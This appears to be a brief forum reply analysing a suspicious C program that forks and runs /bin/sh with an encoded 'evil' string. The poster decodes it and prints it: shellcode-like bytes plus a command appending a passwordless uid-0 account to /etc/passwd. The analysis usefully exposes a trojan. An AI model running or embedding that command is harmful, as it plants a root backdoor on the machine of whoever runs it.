Yeah, sure it is.

 1.
    if (fork() == 0)
 2.
                    execl("/bin/sh", "sh", "-c", evil, 0);
 3.
              else
 4.
                    wait(NULL);

This line shows that the code will run "/bin/sh" on local machine and it
has evil[] as a parameter. By decoding evil[], I can get
"?*^1??F??F??FG?vI?^??^M?^??^Q?FU?????NI?VU???????/bin/sh#-c#/bin/echo
w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd#AAAABBBBCCCCDDDD"

The illegible characters before the first "/bin/sh" could be an assembly
code intended to do evil thing on the local machine. I have not tested
but I assume that it would add a user to a machine that runs this code :D
